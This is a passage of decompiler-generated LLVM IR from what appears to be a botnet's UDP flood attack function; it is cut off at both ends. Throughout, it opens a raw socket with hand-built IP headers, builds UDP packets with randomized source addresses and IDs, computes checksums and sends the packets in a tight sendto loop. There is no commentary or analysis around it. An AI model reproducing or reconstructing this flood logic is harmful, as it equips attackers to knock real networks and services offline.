  %v5_8f5c = inttoptr i32 %v0_8f48 to i32*
  %v6_8f5c = call i32 @attack_get_opt_int(i32 %v0_8f58, i32* %v5_8f5c, i32 4, i32 64)
  %v1_8f64 = urem i32 %v6_8f5c, 256
  store i32 %v1_8f64, i32* %ip.global-to-local, align 4
  %v0_8f68 = load i32, i32* @r5, align 4
  store i32 %v0_8f68, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8f74 = load i32, i32* @r4, align 4
  store i32 %v0_8f74, i32* %r0.global-to-local, align 4
  %v6_8f7c = inttoptr i32 %v0_8f68 to i32*
  %v7_8f7c = call i32 @attack_get_opt_int(i32 %v0_8f74, i32* %v6_8f7c, i32 5, i32 0)
  %v1_8f88 = urem i32 %v7_8f7c, 256
  store i32 %v1_8f88, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_8f94 = load i32, i32* @r5, align 4
  store i32 %v0_8f94, i32* %r1.global-to-local, align 4
  %v0_8f98 = load i32, i32* @r4, align 4
  store i32 %v0_8f98, i32* %r0.global-to-local, align 4
  %v5_8fa0 = inttoptr i32 %v0_8f94 to i32*
  %v6_8fa0 = call i32 @attack_get_opt_int(i32 %v0_8f98, i32* %v5_8fa0, i32 6, i32 65535)
  %v0_8fa8 = load i32, i32* @r5, align 4
  store i32 %v0_8fa8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_8fa0, i32* %sb.global-to-local, align 4
  %v0_8fb8 = load i32, i32* @r4, align 4
  store i32 %v0_8fb8, i32* %r0.global-to-local, align 4
  %v4_8fbc = inttoptr i32 %v0_8fa8 to i32*
  %v5_8fbc = call i32 @attack_get_opt_int(i32 %v0_8fb8, i32* %v4_8fbc, i32 7, i32 65535)
  %v0_8fc0 = load i32, i32* @r5, align 4
  store i32 %v0_8fc0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_8fbc, i32* @sl, align 4
  %v0_8fd0 = load i32, i32* @r4, align 4
  store i32 %v0_8fd0, i32* %r0.global-to-local, align 4
  %v4_8fd4 = inttoptr i32 %v0_8fc0 to i32*
  %v5_8fd4 = call i32 @attack_get_opt_int(i32 %v0_8fd0, i32* %v4_8fd4, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8fe0 = load i32, i32* @r5, align 4
  store i32 %v0_8fe0, i32* %r1.global-to-local, align 4
  store i32 %v5_8fd4, i32* @r6, align 4
  %v0_8fe8 = load i32, i32* @r4, align 4
  store i32 %v0_8fe8, i32* %r0.global-to-local, align 4
  %v4_8fec = inttoptr i32 %v0_8fe0 to i32*
  %v5_8fec = call i32 @attack_get_opt_int(i32 %v0_8fe8, i32* %v4_8fec, i32 1, i32 1)
  %v2_8ff8 = load i32, i32* @global_var_24d4c.56, align 4
  store i32 %v2_8ff8, i32* %r3.global-to-local, align 4
  %v1_8ffc = urem i32 %v5_8fec, 256
  store i32 %v1_8ffc, i32* %ip.global-to-local, align 4
  %v0_9000 = load i32, i32* @r5, align 4
  store i32 %v0_9000, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9008 = load i32, i32* @r4, align 4
  store i32 %v0_9008, i32* %r0.global-to-local, align 4
  %v5_9010 = inttoptr i32 %v0_9000 to i32*
  %v6_9010 = call i32 @attack_get_opt_int(i32 %v0_9008, i32* %v5_9010, i32 25, i32 %v2_8ff8)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_9024 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_9024, i32* %r0.global-to-local, align 4
  %v7_9028 = icmp eq i32 %v3_9024, -1
  store i1 %v7_9028, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9024, i32* @fp, align 4
  br i1 %v7_9028, label %dec_label_pc_93c8, label %dec_label_pc_9034

dec_label_pc_9034:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_903c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_903c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9050 = call i32 @__GI_setsockopt(i32 %v3_9024, i32 0, i32 3, i32 %v6_903c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_9050, i32* %r0.global-to-local, align 4
  %v7_9054 = icmp eq i32 %v5_9050, -1
  store i1 %v7_9054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9054, label %dec_label_pc_93c0, label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9034
  %v0_905c = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_9068 = urem i32 %v0_905c, 65536
  store i32 %v3_9068, i32* %r2.global-to-local, align 4
  %v3_906c = icmp ugt i32 %v3_9068, 1459
  %v9_906c = icmp eq i32 %v3_9068, 1460
  store i1 %v9_906c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_906c, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_905c
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_905c, %bb
  %v0_90c8 = phi i32 [ %v3_9068, %dec_label_pc_905c ], [ 1460, %bb ]
  store i32 %v7_8f44, i32* %r0.global-to-local, align 4
  %v0_9078 = load i32, i32* %sb.global-to-local, align 4
  %v3_9080 = urem i32 %v0_9078, 65536
  store i32 %v3_9080, i32* %ip.global-to-local, align 4
  %v0_9084 = load i32, i32* @r7, align 4
  %v2_9084 = icmp eq i32 %v0_9084, 0
  store i1 %v2_9084, i1* %cpsr_z.global-to-local, align 1
  %v0_9088 = load i32, i32* @sl, align 4
  %v3_9088 = mul i32 %v0_9088, 65536
  br i1 %v2_9084, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  store i32 %v0_90c8, i32* %ip.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_90b8 = phi i32 [ %v3_9080, %bb48 ], [ %v0_90c8, %bb49 ]
  %v3_9098 = urem i32 %v0_9088, 65536
  store i32 %v3_9098, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_90a0 = urem i32 %v7_8f44, 65536
  store i32 %v3_90a0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9084, label %.thread, label %dec_label_pc_90c0

.thread:                                          ; preds = %bb50
  %v2_90b4 = add nsw i32 %v1_90b8, 28
  store i32 %v2_90b4, i32* @sb, align 4
  %v2_90b8 = add nsw i32 %v1_90b8, 8
  store i32 %v2_90b8, i32* @sl, align 4
  br label %dec_label_pc_91e4.preheader

dec_label_pc_90c0:                                ; preds = %bb50
  %v1_90c8 = add nuw nsw i32 %v0_90c8, 28
  store i32 %v1_90c8, i32* @sb, align 4
  %v1_90cc = add nuw nsw i32 %v0_90c8, 8
  store i32 %v1_90cc, i32* @sl, align 4
  %tmp51 = mul i32 %v0_9078, 256
  %v3_90e0 = and i32 %tmp51, 65280
  %tmp52 = udiv i32 %v0_9078, 256
  %v4_90f0 = urem i32 %tmp52, 256
  %v5_90f0 = or i32 %v4_90f0, %v3_90e0
  store i32 %v5_90f0, i32* @r6, align 4
  store i32 %v3_9088, i32* %r1.global-to-local, align 4
  %tmp53 = mul nuw nsw i32 %v1_90c8, 256
  %v3_90fc = and i32 %tmp53, 65280
  store i32 %v3_90fc, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v0_9088, 256
  %v3_9100 = and i32 %tmp54, 65280
  %tmp55 = mul nuw nsw i32 %v1_90cc, 256
  %v3_9104 = and i32 %tmp55, 65280
  store i32 %v3_9104, i32* %ip.global-to-local, align 4
  %tmp56 = udiv i32 %v1_90c8, 256
  %v4_9108 = urem i32 %tmp56, 256
  %v5_9108 = or i32 %v4_9108, %v3_90fc
  store i32 %v5_9108, i32* @lr, align 4
  %tmp57 = udiv i32 %v0_9088, 256
  %v4_910c = urem i32 %tmp57, 256
  %v5_910c = or i32 %v4_910c, %v3_9100
  store i32 %v5_910c, i32* %r0.global-to-local, align 4
  %trunc = trunc i32 %v1_90cc to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp58 = mul i32 %v7_8f44, 256
  %v3_9114 = and i32 %tmp58, 65280
  store i32 %v3_9114, i32* %r2.global-to-local, align 4
  %tmp59 = udiv i32 %v7_8f44, 256
  %v4_9124 = urem i32 %tmp59, 256
  %v5_9124 = or i32 %v4_9124, %v3_9114
  store i32 %v5_9124, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %v4_917c = sext i8 %v5_8f40 to i32
  %sext6 = mul nuw i32 %v5_9108, 65536
  %v4_9198 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_910c, 65536
  %v7_91cc = sdiv i32 %sext7, 65536
  %v1_918c = trunc i32 %v6_8f5c to i8
  %v3_91cc = sext i16 %rev to i32
  br label %dec_label_pc_912c

dec_label_pc_912c:                                ; preds = %.thread9, %dec_label_pc_90c0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_9138 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_9138, i32* %r0.global-to-local, align 4
  store i32 %v2_8f08, i32* %r3.global-to-local, align 4
  %v3_9140 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9140, i32* %r1.global-to-local, align 4
  %v2_9144 = load i32, i32* @r4, align 4
  %v5_9144 = mul i32 %v2_9144, 4
  %v6_9144 = add i32 %v5_9144, %v2_8f08
  %v7_9144 = inttoptr i32 %v6_9144 to i32*
  store i32 %v2_9138, i32* %v7_9144, align 4
  %v0_9148 = load i32, i32* %r3.global-to-local, align 4
  %v1_9148 = load i32, i32* %r1.global-to-local, align 4
  %v4_9148 = mul i32 %v1_9148, 4
  %v5_9148 = add i32 %v4_9148, %v0_9148
  %v6_9148 = inttoptr i32 %v5_9148 to i32*
  %v7_9148 = load i32, i32* %v6_9148, align 4
  store i32 %v7_9148, i32* %r0.global-to-local, align 4
  %v1_914c = inttoptr i32 %v7_9148 to i8*
  %v2_914c = load i8, i8* %v1_914c, align 1
  %tmp = urem i8 %v2_914c, 16
  %v1_9150 = zext i8 %tmp to i32
  %v1_9154 = or i32 %v1_9150, 64
  store i32 %v1_9154, i32* %r3.global-to-local, align 4
  %v1_9158 = trunc i32 %v1_9154 to i8
  store i8 %v1_9158, i8* %v1_914c, align 1
  %v0_915c = load i32, i32* %r0.global-to-local, align 4
  %v1_915c = inttoptr i32 %v0_915c to i8*
  %v2_915c = load i8, i8* %v1_915c, align 1
  %v1_9160 = and i8 %v2_915c, -16
  %v1_9164 = or i8 %v1_9160, 5
  store i32 %v1_8f88, i32* %ip.global-to-local, align 4
  %v0_916c = load i32, i32* %r1.global-to-local, align 4
  %v3_916c = mul i32 %v0_916c, 32
  store i32 %v3_916c, i32* %r2.global-to-local, align 4
  store i8 %v1_9164, i8* %v1_915c, align 1
  %v0_9174 = load i32, i32* %r1.global-to-local, align 4
  %v1_9174 = add i32 %v0_9174, 1
  store i32 %v1_9174, i32* @r4, align 4
  %v0_9178 = load i32, i32* %r2.global-to-local, align 4
  %tmp61 = mul i32 %v0_9174, -8
  %v5_9178 = add i32 %v0_9178, %tmp61
  store i32 %v5_9178, i32* %r2.global-to-local, align 4
  store i32 %v4_917c, i32* %r1.global-to-local, align 4
  %v2_9180 = load i32, i32* %r0.global-to-local, align 4
  %v3_9180 = add i32 %v2_9180, 1
  %v4_9180 = inttoptr i32 %v3_9180 to i8*
  store i8 %v5_8f40, i8* %v4_9180, align 1
  store i32 %v1_8f64, i32* %r3.global-to-local, align 4
  %v0_9188 = load i32, i32* %ip.global-to-local, align 4
  %v2_9188 = icmp eq i32 %v0_9188, 0
  store i1 %v2_9188, i1* %cpsr_z.global-to-local, align 1
  %v2_918c = load i32, i32* %r0.global-to-local, align 4
  %v3_918c = add i32 %v2_918c, 8
  %v4_918c = inttoptr i32 %v3_918c to i8*
  store i8 %v1_918c, i8* %v4_918c, align 1
  %v0_9190 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9190, label %.thread9, label %bb60

bb60:                                             ; preds = %dec_label_pc_912c
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_9194 = load i32, i32* %r0.global-to-local, align 4
  %v4_9194 = add i32 %v3_9194, 6
  %v5_9194 = inttoptr i32 %v4_9194 to i16*
  store i16 64, i16* %v5_9194, align 2
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_912c, %bb60
  store i32 %v4_9198, i32* %ip.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_91a0 = load i32, i32* %r0.global-to-local, align 4
  %v3_91a0 = add i32 %v2_91a0, 9
  %v4_91a0 = inttoptr i32 %v3_91a0 to i8*
  store i8 17, i8* %v4_91a0, align 1
  %v0_91a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_91a4 = trunc i32 %v0_91a4 to i16
  %v2_91a4 = load i32, i32* %r0.global-to-local, align 4
  %v3_91a4 = add i32 %v2_91a4, 2
  %v4_91a4 = inttoptr i32 %v3_91a4 to i16*
  store i16 %v1_91a4, i16* %v4_91a4, align 2
  store i32 %v6_9010, i32* %ip.global-to-local, align 4
  %v1_91ac = load i32, i32* %r0.global-to-local, align 4
  %v2_91ac = add i32 %v1_91ac, 12
  %v3_91ac = inttoptr i32 %v2_91ac to i32*
  store i32 %v6_9010, i32* %v3_91ac, align 4
  %v0_91b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_91b0 = load i32, i32* @r8, align 4
  %v2_91b0 = add i32 %v1_91b0, %v0_91b0
  store i32 %v2_91b0, i32* %r2.global-to-local, align 4
  %v1_91b4 = add i32 %v2_91b0, 16
  %v2_91b4 = inttoptr i32 %v1_91b4 to i32*
  %v3_91b4 = load i32, i32* %v2_91b4, align 4
  store i32 %v3_91b4, i32* %r3.global-to-local, align 4
  %v0_91b8 = load i32, i32* @r5, align 4
  %v1_91b8 = trunc i32 %v0_91b8 to i16
  %v2_91b8 = load i32, i32* %r0.global-to-local, align 4
  %v3_91b8 = add i32 %v2_91b8, 4
  %v4_91b8 = inttoptr i32 %v3_91b8 to i16*
  store i16 %v1_91b8, i16* %v4_91b8, align 2
  %v0_91bc = load i32, i32* %r0.global-to-local, align 4
  %v1_91bc = add i32 %v0_91bc, 20
  store i32 %v1_91bc, i32* %r1.global-to-local, align 4
  %v0_91c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_91c0 = add i32 %v0_91bc, 16
  %v3_91c0 = inttoptr i32 %v2_91c0 to i32*
  store i32 %v0_91c0, i32* %v3_91c0, align 4
  %v0_91c4 = load i32, i32* @r6, align 4
  %v1_91c4 = trunc i32 %v0_91c4 to i16
  %v2_91c4 = load i32, i32* %r0.global-to-local, align 4
  %v3_91c4 = add i32 %v2_91c4, 20
  %v4_91c4 = inttoptr i32 %v3_91c4 to i16*
  store i16 %v1_91c4, i16* %v4_91c4, align 2
  store i32 %v3_91cc, i32* %r0.global-to-local, align 4
  store i32 %v7_91cc, i32* %r3.global-to-local, align 4
  %v0_91d0 = load i32, i32* @r4, align 4
  %v1_91d0 = load i32, i32* @r7, align 4
  %v9_91d0 = icmp eq i32 %v0_91d0, %v1_91d0
  store i1 %v9_91d0, i1* %cpsr_z.global-to-local, align 1
  %v2_91d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_91d4 = add i32 %v2_91d4, 4
  %v4_91d4 = inttoptr i32 %v3_91d4 to i16*
  store i16 %rev, i16* %v4_91d4, align 2
  %v0_91d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_91d8 = trunc i32 %v0_91d8 to i16
  %v2_91d8 = load i32, i32* %r1.global-to-local, align 4
  %v3_91d8 = add i32 %v2_91d8, 2
  %v4_91d8 = inttoptr i32 %v3_91d8 to i16*
  store i16 %v1_91d8, i16* %v4_91d8, align 2
  %v0_91dc = load i32, i32* @r4, align 4
  store i32 %v0_91dc, i32* %stack_var_-44, align 4
  %v5_91e0 = icmp slt i32 %v0_91d0, %v1_91d0
  br i1 %v5_91e0, label %dec_label_pc_912c, label %dec_label_pc_91e4.preheader.loopexit

dec_label_pc_91e4.preheader.loopexit:             ; preds = %.thread9
  %v0_91e8.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_91e4.preheader

dec_label_pc_91e4.preheader:                      ; preds = %.thread, %dec_label_pc_91e4.preheader.loopexit
  %v0_91e8.pre = phi i32 [ %v0_91e8.pre.pre, %dec_label_pc_91e4.preheader.loopexit ], [ 0, %.thread ]
  %v3_9350 = icmp eq i32 %v6_9010, -1
  %v8_9350 = icmp eq i32 %v6_9010, -1
  %v3_9368 = icmp eq i32 %v3_90a0, 65535
  %v2_93a4 = icmp eq i32 %v1_8ffc, 0
  br label %dec_label_pc_91e4

dec_label_pc_91e4:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_92e4, %dec_label_pc_91e4.preheader
  %v0_91e8 = phi i32 [ %v0_91e8.pre, %dec_label_pc_91e4.preheader ], [ 0, %dec_label_pc_92e4 ], [ 0, %dec_label_pc_91e4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_91e8 = icmp eq i32 %v0_91e8, 0
  store i1 %v2_91e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_91e8, label %dec_label_pc_91e4, label %dec_label_pc_91f4

dec_label_pc_91f4:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_92e4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_91f8

dec_label_pc_91f8:                                ; preds = %dec_label_pc_9260, %dec_label_pc_91f4
  %v1_920c = phi i32 [ %v1_92d4, %dec_label_pc_9260 ], [ 0, %dec_label_pc_91f4 ]
  %v5_91fc = mul i32 %v1_920c, 24
  %v1_9200 = load i32, i32* @r8, align 4
  %v2_9200 = add i32 %v1_9200, %v5_91fc
  store i32 %v2_9200, i32* %r3.global-to-local, align 4
  store i32 %v2_8f08, i32* %r1.global-to-local, align 4
  %v1_9208 = add i32 %v2_9200, 20
  %v2_9208 = inttoptr i32 %v1_9208 to i8*
  %v3_9208 = load i8, i8* %v2_9208, align 1
  %v4_9208 = zext i8 %v3_9208 to i32
  store i32 %v4_9208, i32* %r2.global-to-local, align 4
  %v4_920c = mul i32 %v1_920c, 4
  %v5_920c = add i32 %v4_920c, %v2_8f08
  %v6_920c = inttoptr i32 %v5_920c to i32*
  %v7_920c = load i32, i32* %v6_920c, align 4
  store i32 %v7_920c, i32* @r5, align 4
  %v7_9210 = icmp eq i8 %v3_9208, 31
  store i1 %v7_9210, i1* %cpsr_z.global-to-local, align 1
  %v1_9214 = add i32 %v7_920c, 20
  store i32 %v1_9214, i32* @r6, align 4
  %tmp62 = icmp ult i8 %v3_9208, 32
  br i1 %tmp62, label %dec_label_pc_92f8, label %dec_label_pc_921c

dec_label_pc_921c:                                ; preds = %dec_label_pc_91f8
  store i32 %v6_9010, i32* %r3.global-to-local, align 4
  store i1 %v8_9350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_9350, label %dec_label_pc_9358, label %dec_label_pc_9228

dec_label_pc_9228:                                ; preds = %dec_label_pc_92f8, %dec_label_pc_921c
  store i32 %v3_90a0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9368, label %dec_label_pc_9374, label %dec_label_pc_923c

dec_label_pc_923c:                                ; preds = %dec_label_pc_9358.dec_label_pc_923c_crit_edge, %dec_label_pc_9228
  %v1_9240 = phi i32 [ %v1_9240.pre, %dec_label_pc_9358.dec_label_pc_923c_crit_edge ], [ 65535, %dec_label_pc_9228 ]
  store i32 %v3_9080, i32* %r0.global-to-local, align 4
  %v9_9240 = icmp eq i32 %v3_9080, %v1_9240
  store i1 %v9_9240, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9240, label %dec_label_pc_9388, label %dec_label_pc_9248

dec_label_pc_9248:                                ; preds = %dec_label_pc_9374, %dec_label_pc_923c
  %v1_924c = phi i32 [ %v1_9380, %dec_label_pc_9374 ], [ %v1_9240, %dec_label_pc_923c ]
  store i32 %v3_9098, i32* %r1.global-to-local, align 4
  %v9_924c = icmp eq i32 %v3_9098, %v1_924c
  store i1 %v9_924c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_924c, label %dec_label_pc_939c, label %dec_label_pc_9254

dec_label_pc_9254:                                ; preds = %dec_label_pc_9388, %dec_label_pc_9248
  store i32 %v1_8ffc, i32* %r3.global-to-local, align 4
  store i1 %v2_93a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_93a4, label %dec_label_pc_9260, label %dec_label_pc_93b0

dec_label_pc_9260:                                ; preds = %dec_label_pc_9254, %dec_label_pc_939c, %dec_label_pc_93b0
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_9264 = load i32, i32* @r5, align 4
  %v3_9264 = add i32 %v2_9264, 10
  %v4_9264 = inttoptr i32 %v3_9264 to i16*
  store i16 0, i16* %v4_9264, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_926c = load i32, i32* @r5, align 4
  store i32 %v0_926c, i32* @r0, align 4
  %v2_9270 = call i32 @checksum_generic(i32 %v0_926c, i32 20)
  %v3_9270 = trunc i32 %v2_9270 to i16
  %v3_9274 = load i32, i32* @r5, align 4
  %v4_9274 = add i32 %v3_9274, 10
  %v5_9274 = inttoptr i32 %v4_9274 to i16*
  store i16 %v3_9270, i16* %v5_9274, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_927c = load i32, i32* @r6, align 4
  %v3_927c = add i32 %v2_927c, 6
  %v4_927c = inttoptr i32 %v3_927c to i16*
  store i16 0, i16* %v4_927c, align 2
  %v0_9280 = load i32, i32* @r6, align 4
  store i32 %v0_9280, i32* @r1, align 4
  %v1_9284 = add i32 %v0_9280, 4
  %v2_9284 = inttoptr i32 %v1_9284 to i16*
  %v3_9284 = load i16, i16* %v2_9284, align 2
  %v4_9284 = zext i16 %v3_9284 to i32
  store i32 %v4_9284, i32* %r2.global-to-local, align 4
  %v0_9288 = load i32, i32* @sl, align 4
  store i32 %v0_9288, i32* %r3.global-to-local, align 4
  %v0_928c = load i32, i32* @r5, align 4
  store i32 %v0_928c, i32* %r0.global-to-local, align 4
  %v4_9290 = call i32 @checksum_tcpudp(i32 %v0_928c, i32 %v0_9280, i32 %v4_9284, i32 %v0_9288)
  %v5_9290 = trunc i32 %v4_9290 to i16
  store i32 %v4_9290, i32* %r0.global-to-local, align 4
  %v3_9294 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9294, i32* %r3.global-to-local, align 4
  %v3_9298 = mul i32 %v3_9294, 32
  store i32 %v3_9298, i32* %lr.global-to-local, align 4
  %v3_929c = load i32, i32* @r6, align 4
  %v4_929c = add i32 %v3_929c, 6
  %v5_929c = inttoptr i32 %v4_929c to i16*
  store i16 %v5_9290, i16* %v5_929c, align 2
  %v0_92a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_92a0 = load i32, i32* %r3.global-to-local, align 4
  %tmp63 = mul i32 %v1_92a0, -8
  %v5_92a0 = add i32 %v0_92a0, %tmp63
  store i32 %v5_92a0, i32* %lr.global-to-local, align 4
  %v0_92a4 = load i32, i32* @r6, align 4
  %v1_92a4 = add i32 %v0_92a4, 2
  %v2_92a4 = inttoptr i32 %v1_92a4 to i16*
  %v3_92a4 = load i16, i16* %v2_92a4, align 2
  %v4_92a4 = zext i16 %v3_92a4 to i32
  store i32 %v4_92a4, i32* @r6, align 4
  %v1_92a8 = load i32, i32* @r8, align 4
  %v2_92a8 = add i32 %v1_92a8, %v5_92a0
  store i32 %v2_92a8, i32* @lr, align 4
  %v3_92ac = add i32 %v2_92a8, 2
  %v4_92ac = inttoptr i32 %v3_92ac to i16*
  store i16 %v3_92a4, i16* %v4_92ac, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_92b8 = load i32, i32* @r5, align 4
  store i32 %v0_92b8, i32* %r1.global-to-local, align 4
  %v0_92bc = load i32, i32* @fp, align 4
  store i32 %v0_92bc, i32* %r0.global-to-local, align 4
  %v0_92c0 = load i32, i32* @sb, align 4
  store i32 %v0_92c0, i32* %r2.global-to-local, align 4
  %v0_92c4 = load i32, i32* @lr, align 4
  %v6_92cc = call i32 @__libc_sendto(i32 %v0_92bc, i32 %v0_92b8, i32 %v0_92c0, i32 16384, i32 %v0_92c4, i32 16)
  %v3_92d0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_92d0, i32* %r3.global-to-local, align 4
  %v1_92d4 = add i32 %v3_92d0, 1
  store i32 %v1_92d4, i32* %r0.global-to-local, align 4
  %v1_92d8 = load i32, i32* @r7, align 4
  %v9_92d8 = icmp eq i32 %v1_92d4, %v1_92d8
  store i1 %v9_92d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_92d4, i32* %stack_var_-44, align 4
  %v5_92e0 = icmp slt i32 %v1_92d4, %v1_92d8
  br i1 %v5_92e0, label %dec_label_pc_91f8, label %dec_label_pc_92e4

dec_label_pc_92e4:                                ; preds = %dec_label_pc_9260
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_92e8 = icmp eq i32 %v1_92d8, 0
  store i1 %v2_92e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_92e8, label %dec_label_pc_91e4, label %dec_label_pc_91f4

dec_label_pc_92f8:                                ; preds = %dec_label_pc_91f8
  %v1_92f8 = add i32 %v2_9200, 16
  %v2_92f8 = inttoptr i32 %v1_92f8 to i32*
  %v3_92f8 = load i32, i32* %v2_92f8, align 4
  %v0_92fc = call i32 @rand_next()
  store i32 %v0_92fc, i32* %r0.global-to-local, align 4
  %v3_9300 = load i32, i32* %stack_var_-44, align 4
  %v5_9308 = mul i32 %v3_9300, 24
  %v1_930c = and i32 %v3_92f8, 16711680
  store i32 %v1_930c, i32* %ip.global-to-local, align 4
  %v3_9310 = udiv i32 %v3_92f8, 16777216
  %v4_9314 = udiv i32 %v1_930c, 256
  %v5_9314 = or i32 %v4_9314, %v3_9310
  store i32 %v5_9314, i32* %r2.global-to-local, align 4
  %v1_9318 = load i32, i32* @r8, align 4
  %v2_9318 = add i32 %v1_9318, %v5_9308
  store i32 %v2_9318, i32* %r1.global-to-local, align 4
  %v1_931c = and i32 %v3_92f8, 65280
  store i32 %v1_931c, i32* %r3.global-to-local, align 4
  %v1_9320 = add i32 %v2_9318, 20
  %v2_9320 = inttoptr i32 %v1_9320 to i8*
  %v3_9320 = load i8, i8* %v2_9320, align 1
  %v4_9320 = zext i8 %v3_9320 to i32
  store i32 %v4_9320, i32* %ip.global-to-local, align 4
  %v5_9328 = call i32 @llvm.bswap.i32(i32 %v3_92f8)
  %v7_932c = lshr i32 %v0_92fc, %v4_9320
  %v8_932c = add i32 %v7_932c, %v5_9328
  store i32 %v8_932c, i32* %r2.global-to-local, align 4
  %v1_9330 = and i32 %v8_932c, 16711680
  store i32 %v1_9330, i32* %r0.global-to-local, align 4
  %v1_933c = and i32 %v8_932c, 65280
  store i32 %v1_933c, i32* %r1.global-to-local, align 4
  %v5_9344 = call i32 @llvm.bswap.i32(i32 %v8_932c)
  %v1_9348 = load i32, i32* @r5, align 4
  %v2_9348 = add i32 %v1_9348, 16
  %v3_9348 = inttoptr i32 %v2_9348 to i32*
  store i32 %v5_9344, i32* %v3_9348, align 4
  store i32 %v6_9010, i32* %r3.global-to-local, align 4
  store i1 %v8_9350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9350, label %dec_label_pc_9358, label %dec_label_pc_9228

dec_label_pc_9358:                                ; preds = %dec_label_pc_92f8, %dec_label_pc_921c
  %v0_9358 = call i32 @rand_next()
  store i32 %v0_9358, i32* %r0.global-to-local, align 4
  store i32 %v3_90a0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9368, i1* %cpsr_z.global-to-local, align 1
  %v1_936c = load i32, i32* @r5, align 4
  %v2_936c = add i32 %v1_936c, 12
  %v3_936c = inttoptr i32 %v2_936c to i32*
  store i32 %v0_9358, i32* %v3_936c, align 4
  br i1 %v3_9368, label %dec_label_pc_9374, label %dec_label_pc_9358.dec_label_pc_923c_crit_edge

dec_label_pc_9358.dec_label_pc_923c_crit_edge:    ; preds = %dec_label_pc_9358
  %v1_9240.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_923c

dec_label_pc_9374:                                ; preds = %dec_label_pc_9358, %dec_label_pc_9228
  %v0_9374 = call i32 @rand_next()
  %v1_9374 = trunc i32 %v0_9374 to i16
  %v3_9378 = load i32, i32* @r5, align 4
  %v4_9378 = add i32 %v3_9378, 4
  %v5_9378 = inttoptr i32 %v4_9378 to i16*
  store i16 %v1_9374, i16* %v5_9378, align 2
  store i32 %v3_9080, i32* %r0.global-to-local, align 4
  %v1_9380 = load i32, i32* @r4, align 4
  %v9_9380 = icmp eq i32 %v3_9080, %v1_9380
